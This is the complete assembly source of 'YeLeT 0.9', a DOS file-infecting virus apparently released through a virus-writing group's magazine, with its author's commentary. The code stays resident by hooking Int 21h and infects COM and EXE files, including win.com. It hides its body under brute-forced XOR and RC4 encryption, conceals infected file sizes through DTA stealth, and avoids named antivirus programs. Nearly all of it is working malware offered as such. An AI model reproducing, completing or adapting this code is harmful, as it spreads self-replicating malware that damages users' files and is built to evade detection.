comment $

 ++++++++++++++++++++++++++++++ YeLeT v0.9 ++++++++++++++++++++++++++++++++++

     This is YeLeT version 0.9, it is not the final version, i wanted to
   add some more stuff but didn't get it done until we released CB #4.
   Also this is NOT for educational purposes :) because its HIGHLY
   unoptimized (... well, but it werx!)
   I know that this virus is getting detected by AVP as 'Suspicion
   Type_ComExeTsr' (don't know about other scanners) but i don't care about
   that yet as its just a beta version, a final version (with many
   improvments) will sometimes be available from the CB webpage.

     Anyway, YeLeT stays resident and hooks Int 21h (func: 4Bh) and infects
   MZ/ZM EXE and COM files both in plain DOS and after loading Winblows.
   It uses 2 encryption layers, the second one uses just simple XOR (with
   some bruteforce cracking so the key doesn't have to be stored in the
   code) and the first layer uses my own Unoptimized-Viral-RC4 routine
   (this routine doesn't use any bruteforce cracking routines as it would
   make the user a bit suspicious if files would take billions of years to
   load ;-)). Also it uses simple DTA-size stealth, direct infection of
   win.com, and it avoids infection of some AV programs and archivers.

     Credits & Greets go to:

    Spanska          - for some useful IDEAs!! :-)
    Bruce Schneier   - for the book Applied Cryptography (i used the RC4
                       algorithm described in his book).
                       ISBN - 0-471-11709-9 -
    AVP              - their support sucks, they always just tell you to
                       wait for the next update, but their scanner is the
                       best! :-)
    Horny Toad       - thanks for sticking together our magazines all the
                       time!
    Opic             - thanks for helping him ^^^ out with the mag this
                       time. ;-)

     ... and before the interesting stuff beginns, here is a description of
   RC4 (from 'Applied Cryptography'):

  - The algorithm works in OFB: The keystream is independent of the
    plaintext. It has a 8 * 8 S-box: S[0], S[1], ... S[255]. The entries
    are a permutation of the numbers 0 through 255, and the permutation is
    a function of the variable-length key. It has two counters, i and j,
    initialized at zero.

      i = (i + 1) mod 256
      j = (j + S[i]) mod 256
      swap S[i] and S[j]
      t = (S[i] + S[j]) mod 256
      K = S[t]

    The byte K is XORed with the plaintext to produce ciphertext or XORed
    with the ciphertext to produce plaintext.

  - Initializing the S-box is also easy. First fill it linearly:
    S[0] = 0, S[1] = 1,... , S[255] = 255
    Then fill another 256-byte array with the key, repeating the key as
    often as necessary to fill the entire array: K[0], K[1],... K[255]. Set
    the index j to zero, then:

      for i = 0 to 255:
        j = (j + S[i] + K[i]) mod 256
        swap S[i] and S[j]

   Thats it, please send bug reports to spooky@nym.alias.net :-)

 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

        $

.model tiny                 ; .model virus
.286                        ; allow 286 instructions (286's are needed for
                            ; pusha/popa)
.code                       ; code begins here
 ORG 0CBh                   ; Brought to you by CB ;-)
 jumps                      ; automatically change conditional jumps which are
                            ; bigger then -128/+127 bytes.
                            ; some constants
 com equ 0                  ; used to detect which 'restore routine' to run
 exe equ 1
 off equ 0                  ; archiver executed? (used in the stealth routine)
 on  equ 1                  ; 

 exit_exe:                          ; only used at the first execution
  mov ax,4c00h
  int 21h

 start:                     ; entry point


  call delta                ; get a delta offset
 delta:
  pop bp
  sub bp,offset delta

  push ds                   ; save DS and ES (point to the PSP) for later use
  push es                   ; when returning control to an exe file

  push cs                   ; DS = ES = CS
  push cs
  pop ds
  pop es

  lea si,[bp+xor_crypt_start]           ; simple bruteforce attack to find the
 bruteforce_loopy:                  ; decryption key (like Spanskas IDEA
  mov al,byte ptr cs:[si]           ; virus). it fools any scanner which
  xor al,byte ptr cs:[bp+xor_value] ; doesn't have something like AVP's 'code-
  cmp al,90h                        ; analyzer' function.
  je found_it
  inc byte ptr cs:[bp+xor_value]
  jmp bruteforce_loopy
  

 found_it:
                                ; decrypt virus using a simple XOR algorithm
                                ; from xor_crypt_start
  mov di,si                     ; to xor_crypt_start
  mov cx,the_end - xor_crypt_start  ; the_end - xor_crypt_start byte's
  call crypt                    ; decrypt it
  jmp xor_crypt_start               ; jump to the now decrypted part

 xor_value db 0                 ; en/decryption key used by the XOR encryption

                                
 crypt:                             ; en/decryption routine
  lodsb                             ; load one byte from DS:SI into AL
  xor al,byte ptr cs:[bp+xor_value] ; XOR it with xor_value
  stosb                             ; store byte in AL at ES:DI
  loop crypt                        ; repeat until CX = 0
  ret                               ; return

 xor_crypt_start:                   ; - xor encrypted part begins here -

  nop                           ; 'checksum' used by bruteforce decryption
                                ; routine

  cmp byte ptr cs:[bp+first],on
  je rc4_crypt_start            ; if its the first execution we do not decrypt
                                ; the code using RC4, just jump over it

  mov dx,42                     ; expand the 42 byte key into a 256 byte
  call rc4expandkey             ; array

                                    ; decrpyt code using RC4, 
  lea si,[bp+rc4_crypt_start]       ; from rc4_crypt_start
  mov di,si                         ; to rc4_crypt_start
  mov dx,the_end - rc4_crypt_start  ; the_end - rc4_crypt_start bytes
  call rc4crypt                     ; decrypt it
  jmp rc4_crypt_start               ; jump over the en/decryption routines.


 rc4expandkey proc
  pusha
  mov byte ptr [bp+key_ptr],0

  lea di,[bp+rc4state]             ; fill the rc4state array with 0 .. 255
  xor ax,ax
 linear_loopy:
  stosb
  inc al
  jnz linear_loopy

  xor ax,ax             ; J = 0
  xor bx,bx             ; I = 0
 mutate_loopy:

  lea si,[bp+rc4state] 
  add si,bx             
  mov ch,cs:[si]        ; CH = S[i]

  push bx
  mov bl,[bp+key_ptr]

  lea si,[bp+rc4key]    
  add si,bx             
  mov cl,cs:[si]        ; CL = K[i]

  inc [bp+key_ptr]
  cmp [bp+key_ptr],dl   ; dl = keylength ... reset key_ptr?
  jne no_reset
  mov [bp+key_ptr],0
 no_reset:
  pop bx

  add al,cl             ; J = J + K[i]
  add al,ch             ; J = J + S[i]
  mov di,ax             ; DI = J

                        ; swap (S[i], S[j])
  lea si,[bp+rc4state]
  add si,bx
  mov al,cs:[si]        ; al = S[i]

  mov [bp+temp],al      ; temp = S[i]

  lea si,[bp+rc4state]
  add si,di
  mov al,cs:[si]        ; al = S[j]

  lea si,[bp+rc4state]
  add si,bx
  mov cs:[si],al        ; S[i] = S[j]

  mov al,[bp+temp]      ; al = S[i]

  lea si,[bp+rc4state]
  add si,di
  mov cs:[si],al        ; S[j] = S[i]

  inc bl                ; I = I + 1
  jnz mutate_loopy      ; 256 loops done? yes - exit
  popa
  ret
 rc4expandkey endp


 rc4crypt proc
  pusha
  mov word ptr cs:[bp+dest],di
  xor bx,bx
  xor di,di
  xor ax,ax
  xor cx,cx
 crypt_loopy:
  inc bl                ; I = I + 1

  mov cx,di             ; CX = DI = J
  push di
  lea di,[bp+rc4state]
  add di,bx
  add cl,byte ptr cs:[di]
  pop di
  mov di,cx             ; J = J + S[i]

  push di
  lea di,[bp+rc4state]
  add di,bx
  mov al,byte ptr cs:[di]      ; swap (S[i], S[j])
  pop di
  mov byte ptr cs:[bp+temp],al
  push si
  lea si,[bp+rc4state]
  add si,di
  mov al,byte ptr cs:[si]
  lea si,[bp+rc4state]
  add si,bx
  mov byte ptr cs:[si],al
  pop si
  mov al,byte ptr cs:[bp+temp]
  push si
  lea si,[bp+rc4state]
  add si,di
  mov byte ptr cs:[si],al
  pop si

  push si
  lea si,[bp+rc4state]
  add si,di
  mov al,byte ptr cs:[si] ; al = S[j]
  lea si,[bp+rc4state]
  add si,bx
  add al,byte ptr cs:[si] ; t = al = S[i] + S[j]
  pop si

  push di
  mov di,ax
  push si
  lea si,[bp+rc4state]
  add si,di
  mov al,byte ptr cs:[si] ; K = al = S[t]
  pop si

  mov di,word ptr cs:[bp+dest]  ; DI = destination
  mov cl,cs:[si]        ; cl = byte to en/decrypt
  xor cl,al             ; cl = cl xor K
  mov cs:[di],cl        ; destination = cl
  inc word ptr cs:[bp+dest] ; increase destination
  inc si                ; increase source
  pop di

  dec dx                ; decrease data length
  jnz crypt_loopy       ; if zero exit
  popa
  ret
 rc4crypt endp

 key_ptr db 0
 dest dw ?
 temp db ?
 rc4state db 256 dup (?)
 rc4key db 42 dup(?)

 first db on


 rc4_crypt_start:       ; - RC4 encrypted part begins here -

  mov byte ptr cs:[bp+first],off
  mov byte ptr cs:[bp+archiver],off

  mov ax,0deadh                 ; installation check...
  int 21h                       ; why do i use 0deadh all the time???? :]

  cmp bx,0deadh                 ; if the installation check returns 0deadh
  je get_outta_here             ; we are already in memory, and restore
                                ; control to the host

 go_tsr:                        ; if not, we go resident

  pop es                        ; pop ES for a sec, so we can use the PSP
  push es                       ; push it again, for later use

  sub word ptr es:[2], 140h     ; decrease the top of memory by 140h * 16 byte
                                ; from the PSP

  mov ax,es                     ; AX = ES
  dec ax                        ; AX - 1
  mov es,ax                     ; ES = AX (= MCB)

  sub word ptr es:[3], 140h     ; decrease the free amount of memory after the
                                ; program by 140h * 16 bytes (5kB) from the
                                ; MCB

  mov ax,40h                    
  mov es,ax                     ; ES = AX = 40h (= Bios Data Segment)

  sub word ptr es:[13h],5       ; decrease the free memory by 5 * 1024 bytes
                                ; (again 5kB) from the Bios

  mov ax,word ptr es:[13h]      ; AX = free memory (in kB)
  shl ax,6                      ; we need it in paragraphs (segments)
                                ; free segment = AX * 1024 / 16

  mov es,ax                     ; ES = AX (= free segment)

  push cs
  pop ds                        ; DS = CS

  mov cx,the_end - start        ; the_end - start bytes
  lea si,[bp+start]             ; from DS:start
  xor di,di                     ; to   ES:0
  rep movsb                     ; copy the virus into the free segment

  xor ax,ax
  mov ds,ax                     ; DS = AX = 0 (= Interrupt Vector Table)

  lea ax,new_int_21h            ; AX = offset of the new interrupt 21h routine
  sub ax,offset start           ; substract 'offset start' because we moved it
                                ; down to offset 0
  mov bx,es                     ; BX = ES (= segment where the new interrupt
                                ;            routine is in)

  cli                           ; disable ints
  xchg ax,word ptr ds:[21h*4]   ; save the old interrupt's address in BX and
  xchg bx,word ptr ds:[21h*4+2] ; AX, and overwrite it with the new one
  mov word ptr es:[original_int_21h-offset start],ax    ; save AX and BX in
  mov word ptr es:[original_int_21h+2-offset start],bx  ; the virus's code
  sti                           ; enable ints again

  push cs                       ; DS = ES = CS
  push cs
  pop ds
  pop es

                              ;;;;

 get_outta_here:

                              ; direct infection of win.com begins here,
  push word ptr cs:[bp+state] ; save 'state' as it will be changed in the
                              ; infection routine.

  lea si,[bp+header]          ; save the first 3 bytes in original_3, needed
  lea di,[bp+original_3]      ; for later restoration if its a com file.
  movsw
  movsb

                                  ; copy the original IP, CS, SS, SP
  lea si,[bp+old_ip]              ; from old_ip
  lea di,[bp+original_ip]         ; to original_ip
  mov cx,4                        ; 4 words to copy
  rep movsw                       ; needed for restoring control if its an exe
                                  ; file.

  lea ax,[bp+wincom_done]                     ; save the return address in
  mov word ptr cs:[bp+original_int_21h],ax    ; original_int_21h (used to
  mov word ptr cs:[bp+original_int_21h+2],cs  ; return from the 'fake' int21h
                                              ; 4Bh routine.

  mov ah,4bh                      ; fake file execution (= infection)
  lea dx,[bp+wincom]              ; c:\windows\win.com
  jmp new_int_21h                 ; 'int 21h'

 wincom_done:                     ; return here after infecting win.com

  pop ax                          ; restore the 'state'

  cmp al,com                      ; check the state if we are com or exe
  je restore_com                  ; jump to restore_com routine if we are com

 restore_exe:                     ; else we must be an exe :)

  pop es                          ; restore ES and DS (point to the PSP)
  pop ds

  mov ax,es                     ; AX = ES (= PSP)
  add ax,10h                    ; add 10h paragraphs to AX,
                                ; 10h * 16 = 100h bytes, so it ignores the
                                ; PSP and points directly to the beginning of
                                ; the code/data

  add word ptr cs:[bp+original_cs],ax ; CS = real CS (as before infection)
                                      ; as the initial CS is 'relative to
                                      ; start of file' we adjust the initial
                                      ; CS value by adding AX (beginning of
                                      ; code/data)
  add ax,word ptr cs:[bp+original_ss] ; same for initial SS, as it is a relative
                                      ; value too
  cli                                 ; disable ints
  mov ss,ax                           ; SS = real SS
  mov sp,word ptr cs:[bp+original_sp] ; SP = real SP
  sti                                 ; enable ints

 db 0eah                              ; jump to the beginning of the host
 original_ip dw ?                     ; JMP FAR to original_ip,
 original_cs dw ?                     ; and original_cs (= JMP FAR CS:IP)
 original_sp dw ?
 original_ss dw ?


 restore_com:                     ; this is where we go to restore control if
                                  ; we are a com file
  mov cx,3                        ; move the first 3 bytes
  lea si,[bp+original_3]              ; from 'header'
  mov di,100h                     ; to 100h (beginning of com files)
  rep movsb                       ; copy them..

  pop es
  pop ds

  push 100h                       ; push 100h onto the stack
  ret                             ; restore control (return to 100h)

 new_int_24h:                     ; new crittical error handler
  iret                            ; just return if its called :)
 original_int_24h dd ?

 new_int_21h:                     ; the new interrupt 21h begins here
  pushf                           ; as always, push flags at first
  cmp ax,0deadh                   ; install check?
  jne no_installcheck             ; no...
  mov bx,ax                       ; yes!? then BX = AX (= 0deadh)
  popf                            ; pop flags again
  iret                            ; and return from interrupt

 no_installcheck:                 ; here we go if there was no install check

  cmp ah,4bh                      ; is something getting executed?
  je infect                       ; yes? then goto infect
  cmp ah,4eh                      ; findfirst?
  je stealth                      ; yes? - stealth
  cmp ah,4fh                      ; findnext?
  je stealth                      ; yes? - stealth
  cmp ah,4ch                      ; terminate program?
  je exit_prog                    ; 
  jmp restore                     ; all other functions execute the normal int



 exit_prog:
  push bp
  call exit_delta
 exit_delta:
  pop bp
  sub bp,offset exit_delta

  mov byte ptr cs:[bp+archiver],off
  pop bp
  jmp restore




 stealth:
  popf                            ; restore the flags, they don't matter here.
  push bp                         ; save BP (changed in the delta routine)

  call stealth_delta              ; well, another delta offset :]
 stealth_delta:
  pop bp
  sub bp,offset stealth_delta

  pushf
  call dword ptr cs:[bp+original_int_21h] ; fake int 21h call

  pushf                           ; save everything (returned flags and regs!)
  pusha
  push es                         
  push ds                         

  mov ah,2fh                      ; get address of DTA in ES:BX
  int 21h

  push es                         ; DS = ES (= DTA), so we can access the
  pop ds                          ; filename in the dta (by using func 3Dh,..)

  mov di,bx
  add di,1eh                      ; DI points to the beginning of the filename
  push di                         ; save that for later
  mov al,'.'                      ; search for a dot
  mov cx,13                       ; 13 characters max
  cld                             ; forward direction
  repne scasb                     ; search while not found and cx <> 0

  cmp word ptr es:[di],'OC'       ; if the extension begins with 'CO' it
  je might_be_com_exe             ; 'might' be a com file
  cmp word ptr es:[di],'XE'       ; if the extension begins with 'EX' it
  je might_be_com_exe             ; 'might' be an exe file
  pop di                          ; if the extension doesn't begin with
  jmp no_stealth                  ; 'CO' neither with 'EX' we restore the
                                  ; stack (pop di) and leave the stealth
                                  ; routine.

 might_be_com_exe:
  cmp byte ptr es:[di+2],'M'      ; if the last character of the extension is
  je probably_com_exe             ; a 'M' the file is 'probably' a com file :)
  cmp byte ptr es:[di+2],'E'      ; blah..
  je probably_com_exe
  pop di                          ; if its not a com and not an exe we restore
  jmp no_stealth                  ; the stack again and leave the stealth
                                  ; routine.

 probably_com_exe:
  pop dx                          ; restore DX (filename)    
  push bx                         ; save BX (offset of DTA)

  mov ax,3d00h                    ; open file at DS:DX for reading
  int 21h
  jnc no_error                    ; (an error occures if the file is in
  pop bx                          ; another directory), if so, restore the
  jmp no_stealth                  ; stack (pop bx) and leave...

 no_error:
  xchg ax,bx                      ; put the filehandle into BX

  push cs
  pop ds                          ; DS = CS

  mov ah,3fh                      ; read
  mov cx,1ch                      ; 1Ch bytes
  lea dx,[bp+header]              ; to 'header'
  int 21h

  mov ah,3eh                      ; close the file.
  int 21h                         

  pop bx                          ; restore BX (offset of dta)


  cmp word ptr cs:[bp+header],'ZM'  ; if the file begins with either 'ZM'
  je check_exe
  cmp word ptr cs:[bp+header],'MZ'  ; or 'MZ' it is an exe file, 
  je check_exe                      ; if so it checks if the EXE file is
                                    ; infected.

 check_com:                         
  mov cx,the_end - start + 7        ; else it checks the COM file for an
  mov ax,word ptr es:[bx+1ah]       ; infection. filesize goes into AX.
  sub ax,(the_end - start)+3+7      ; substract virussize + 3(jmp) + 7(enuns)
  cmp ax,word ptr cs:[bp+header+1]  ; if thats equal to the jump in the header
  je stealth_it                     ; it is already infected and will be
  jmp no_stealth                    ; stealthed... else, leave the stealth
                                    ; routine.

 check_exe:
  cmp word ptr cs:[bp+header+12h],'XV'  ; if it is an exe file we just check
  jne no_stealth                        ; the infection marker from the header
                                        ; not infected? - leave
  mov cx,the_end - start

 stealth_it:
  cmp byte ptr cs:[bp+archiver],on      ; if an archiver is running don't
  je no_stealth                         ; stealth it.
  sub word ptr es:[bx+1ah],cx               ; substract the virussize from
  sbb word ptr es:[bx+1ch],0                ; the filesize in the dta.

 no_stealth:
  pop ds                                ; restore everything that was pushed
  pop es                                ; before
  popa
  popf
  pop bp
  retf 2                                ; and exit the interrupt, without
                                        ; poping (restoring) the flags!


 infect:                          ; infect the file at DS:DX

  pusha                           ; save all regs
  push es                         ; save DS,
  push ds                         ; ES
  push dx                         ; and DX (= offset of the filename)

  call infect_delta
 infect_delta:
  pop bp
  sub bp,offset infect_delta

  push ds
  pop es

  cld
  xor ax,ax
  mov cx,64
  mov di,dx
  repne scasb                 ; search for the end (zero) of the filename

  mov ax,word ptr ds:[di-10]  ; check for PKzip
  mov bx,word ptr ds:[di-8]
  or ax,2020h                 ; make it lower case
  or bx,2020h
  cmp ax,'kp'
  je exec_pkzip              

  mov ax,word ptr ds:[di-8]   ; check for ARJ and RAR
  mov bx,word ptr ds:[di-6]
  or ax,2020h
  or bx,2020h
  cmp ax,'ra'
  je exec_arj
  cmp ax,'ar'
  je exec_rar
  jmp no_archiver

 exec_pkzip:
  cmp bx,'iz'
  je exec_archiver
  jmp no_archiver

 exec_arj:
  cmp bx,'.j'
  je exec_archiver
  jmp no_archiver

 exec_rar:
  cmp bx,'.r'
  je exec_archiver
  jmp no_archiver
  
 exec_archiver:
  mov byte ptr cs:[bp+archiver],on

 no_archiver:
  std
  mov al,'\'
  mov cx,64
  repne scasb
  mov ax,word ptr ds:[di+2]
  or ax,2020h

  push cs
  pop es

  cld
  lea di,[bp+avs]
  mov cx,5
  repne scasw                     ; search for AV programs....
  jne no_av

  pop dx
  pop ds
  pop es
  popa
  jmp restore

 no_av:
  push ds                       ; set a new crittical error handler (int 24h)
  xor ax,ax
  mov ds,ax                     ; DS = AX = 0 (= Interrupt Vector Table)

  lea ax,[bp+new_int_24h]       ; AX = offset of the new interrupt 24h routine
  mov bx,cs                     ; BX = CS (= segment where the new interrupt
                                ;            routine is in)
  cli                           ; disable ints
  xchg ax,word ptr ds:[24h*4]   ; save the old interrupt's address in BX and
  xchg bx,word ptr ds:[24h*4+2] ; AX, and overwrite it with the new one
  mov word ptr cs:[bp+original_int_24h],ax    ; save AX and BX in
  mov word ptr cs:[bp+original_int_24h+2],bx  ; the virus's code
  sti                           ; enable ints again
  pop ds

  mov ax,4300h                    ; get attributes of filename at DS:DX
  int 21h

  push cx                         ; save them

  mov ax,4301h                    ; fubarize the attributes
  xor cx,cx
  int 21h
  jc error                        ; if there was an error while writing to the
                                  ; disk we cancel the infection

  mov ax,3d02h                    ; open the file at DS:DX
  int 21h
  jc error

  xchg ax,bx                      ; BX = filehandle

  push cs                         ; DS = ES = CS
  push cs
  pop ds
  pop es

  mov ax,5700h                    ; get file time/date
  int 21h

  push cx                         ; save file time
  push dx                         ; and date

  mov ah,3fh                      ; read from file
  mov cx,1ch                      ; 1Ch bytes
  lea dx,[bp+header]              ; to header
  int 21h
  jc close                        ; can't read from file? then close it...
  cmp ax,1ch                      ; less then 1ch bytes read?
  jne close                       ; then close it too...


  cmp word ptr cs:[bp+header],'MZ'  ; does the header begin with 'ZM'?
  je infect_exe

  cmp word ptr cs:[bp+header],'ZM'  ; does the header begin with 'MZ'?
  je infect_exe

 infect_com:                      ; no MZ/ZM? then it must be a com...

  mov ax,4202h                    ; set filepointer to the end
  xor cx,cx
  xor dx,dx
  int 21h

  push ax                           ; save filesize
  sub ax,(the_end - start) + 3+7    ; decrease it by ('virussize'+3+7)
  cmp ax,word ptr cs:[bp+header+1]  ; and compare that value with the 2nd byte
  pop ax                            ; in the header. (restore filesize)
  je close                          ; if they match, the file is already
                                    ; infected.

  sub ax,3                            ; if not already infected, we calculate
  mov word ptr cs:[bp+new_jump+1],ax  ; a new jump,
  mov byte ptr cs:[bp+state],com      ; and change the 'state' to COM.

  mov ax,4201h                      ; seeks to EOF - 7 (beginning of ENUNSxx)
  mov cx,-1
  mov dx,-7
  int 21h

  mov ah,3fh                        ; read the enuns into a buffer
  lea dx,[bp+enuns]
  mov cx,7
  int 21h

  add word ptr cs:[bp+enuns+5],the_end - start+7  ; add the virus's size + 7
                                                  ; to the word at the end of
                                                  ; enuns.

  call encrypt                      ; this gets a new en/decryption key, and
                                    ; encrypts the whole virus from
                                    ; xor_crypt_start till the_end and stores
                                    ; the encrypted code at the_end.

  call append                       ; append the virus to the end of the file.

  mov ah,40h                        ; also add the ENUNSxx to the end of
  lea dx,[bp+enuns]                 ; COM files, this makes winblows 95 com
  mov cx,7                          ; files functioning again :)
  int 21h

  mov ax,4200h                      ; go to the beginning of the file
  xor cx,cx
  xor dx,dx
  int 21h

  mov ah,40h                        ; and write the new jump over the first
  lea dx,[bp+new_jump]              ; 3 byte.
  mov cx,3
  int 21h

                                    ;;;;

  jmp close                         ; jump over the exe infection routine to
                                    ; close the file.


 infect_exe:                        ; the marker was either ZM or MZ so it
                                    ; must be an exe file
  cmp word ptr cs:[bp+header+12h],'XV'  ; check for the infection marker at
  je close                              ; offset 12h in the exe header, if
                                        ; its already there we close the file.

  cmp word ptr cs:[bp+header+18h],40h   ; check for new exe files. if the
  jae close                             ; offset of the relocation table entry
                                        ; is above or equal 40h it is probably
                                        ; a new exe file and we close it.

  mov word ptr cs:[bp+header+12h],'XV'  ; set infection marker
  mov byte ptr cs:[bp+state],exe        ; change state to EXE

                                        ; save important fields from the
  mov ax,word ptr cs:[bp+header+14h]    ; header:
  mov word ptr cs:[bp+old_ip],ax        ; offset 14h - initial IP
  mov ax,word ptr cs:[bp+header+16h]
  mov word ptr cs:[bp+old_cs],ax        ; offset 16h - initial CS
  mov ax,word ptr cs:[bp+header+0eh]
  mov word ptr cs:[bp+old_ss],ax        ; offset 0eh - initial SS
  mov ax,word ptr cs:[bp+header+10h]
  mov word ptr cs:[bp+old_sp],ax        ; offset 10h - initial SP

  mov ax,4202h                        ; seek to the end of the file
  xor cx,cx
  xor dx,dx
  int 21h

  mov word ptr cs:[bp+filesize],ax    ; save the filesize
  mov word ptr cs:[bp+filesize+2],dx

  mov cx,512                          ; overlay check, get the filesize in 512
  div cx                              ; byte pages

  cmp dx,0                            
  je no_remainder2                    ; if there is a remainder in DX
  inc ax                              ; increase AX
 no_remainder2:

  cmp word ptr cs:[bp+header+2],dx    ; if DX matches offset 2 of the exe hdr
  jne close                           ; and if AX matches offset 4 there are
  cmp word ptr cs:[bp+header+4],ax    ; no overlays, if there are overlays we
  jne close                           ; have to close the file.

  mov ax,word ptr cs:[bp+filesize]    ; restore filesize in DX:AX
  mov dx,word ptr cs:[bp+filesize+2]

  push ax                             ; save filesize again, some
  push dx                             ; optimizations would be nice here :^)

  add ax,the_end - start              ; add virus size to filesize
  adc dx,0

  mov cx,512                          ; convert it to 512 byte pages
  div cx

  cmp dx,0                            ; as always, if there is a remainder in
  je no_remainder                     ; DX we have to increase AX.
  inc ax
 no_remainder:

  mov word ptr cs:[bp+header+4],ax    ; save the new filesize at offset 4 and
  mov word ptr cs:[bp+header+2],dx    ; 2 in the exe header.

  pop dx                              ; restore filesize, again
  pop ax

  mov cx,16                           ; at this time convert it to 16 byte
  div cx                              ; paragraphs

  mov cx,word ptr cs:[bp+header+8]    ; substract the headersize from it, so
  sub ax,cx                           ; we get the new CS:IP in AX:DX

  mov word ptr cs:[bp+header+16h],ax      ; save CS
  mov word ptr cs:[bp+header+14h],dx      ; save IP
  mov word ptr cs:[bp+header+0eh],ax      ; save SS (= CS)
  mov word ptr cs:[bp+header+10h],0fffeh  ; save SP

  call encrypt                      ; encrypts the virus and stores it at
                                    ; the_end.

  call append                       ; append the virus at the end of the file.

  mov ax,4200h                      ; seek to the beginning
  xor cx,cx
  xor dx,dx
  int 21h

  mov ah,40h                        ; replace the exe header with the new one.
  lea dx,[bp+header]
  mov cx,1ch
  int 21h

                                    ;;;;

 close:                             ; restore stuff like file time/date,
                                    ; attribs and then close it.

  mov ax,5701h                        ; restore the saved file time and date
  pop dx
  pop cx
  int 21h

  mov ah,3eh                        ; close it!
  int 21h

 error:
  pop cx                            ; restore attribs in CX
  pop dx                            ; restore the filename
  pop ds                            ; restore DS
  mov ax,4301h
  int 21h                           ; set attributes (CX on filename at DS:DX)

  push ds                       ; restore the original crittical error handler
  xor ax,ax
  mov ds,ax                     ; DS = AX = 0 (= Interrupt Vector Table)

  les dx,cs:[bp+original_int_24h] ; ES:DX = dword ptr cs:[original_int_24h]

  cli                           ; disable ints
  mov word ptr ds:[24h*4],dx    ; save the old address
  mov word ptr ds:[24h*4+2],es
  sti                           ; enable ints again
  pop ds

  pop es                            ; restore ES and
  popa                              ; the registers.


 restore:                           ; restore the original interrupt call
  popf                              ; pop flags
 db 0eah                            ; and JuMP FAR to
 original_int_21h dd ?              ; the real address of int21h
        
 encrypt proc                       ; used to encrypt the virus code

  mov cx,42                         ; fill the rc4key with 42 'random' bytes.
  lea di,[bp+rc4key]
 rc4_key_loopy:
  in al,40h
  mov byte ptr cs:[di],al
  inc di
  loop rc4_key_loopy

  in al,40h                         
  mov byte ptr cs:[bp+xor_value],al ; get a new 'random' key into xor_value

  lea si,[bp+start]                 ; copy the whole virus code to the_end
  lea di,[bp+the_end]
  mov cx,the_end - start
  rep movsb

  mov dx,42                         ; encrypt the 1st layer using RC4
  call rc4expandkey

  lea si,[bp+the_end]
  add si,offset rc4_crypt_start
  sub si,offset start
  mov di,si
  mov dx,the_end - rc4_crypt_start
  call rc4crypt


  lea si,[bp+the_end]               ; encrypt the 2nd layer using XOR
  add si,offset xor_crypt_start
  sub si,offset start
  mov di,si                        
  mov cx,the_end - xor_crypt_start  
  call crypt

  mov byte ptr cs:[bp+xor_value],0  ; set xor_value (decryption key) to zero
                                    ; (for bruteforce cracking)

  ret                               ; return
 encrypt endp

 append proc
  mov ah,40h                        ; write the first, unencrypted part of the
  lea dx,[bp+start]                 ; virus into the file. (start till
  mov cx,xor_crypt_start - start        ; xor_crypt_start)
  int 21h


  mov ah,40h                        ; write the encrypted part into the file,
  lea dx,[bp+the_end]               ; beginning at the_end
  add dx,offset xor_crypt_start
  sub dx,offset start
  mov cx,the_end - xor_crypt_start  ; the_end - xor_crypt_start bytes.
  int 21h
  ret                               ; return
 append endp

 header db 0cdh,20h,1ah dup ('?')   ; buffer for exe header and com stuff
 old_ip dw offset exit_exe          ; buffer for the original IP
 old_cs dw 0                        ; CS
 old_sp dw 0fffeh                   ; SP
 old_ss dw 0                        ; SS
 new_jump db 0e9h,0,0               ; buffer used by com infection to
 original_3 db 3 dup(?)             ; calculate a new jump
                                    
 message1 db 'YeLeT 0.9, just another bug in your Micro$oft System...',10,13
          db '$'

 filesize dd ?                      ; buffer for the filesize [optimization
                                    ; needed! ;]
 wincom db 'c:\windows\win.com',0
 avs db 'scavtbf-fi'                ; anti virus programs we are checking for
                                    ; SCan, AVp, TBav (and co.), F-prot and
                                    ; FIndviru
 state db exe                       ; represents the current filetype
 archiver db off
 enuns db 7 dup(?)                  ; buffer for win95's ENUNS

 the_end:

end start
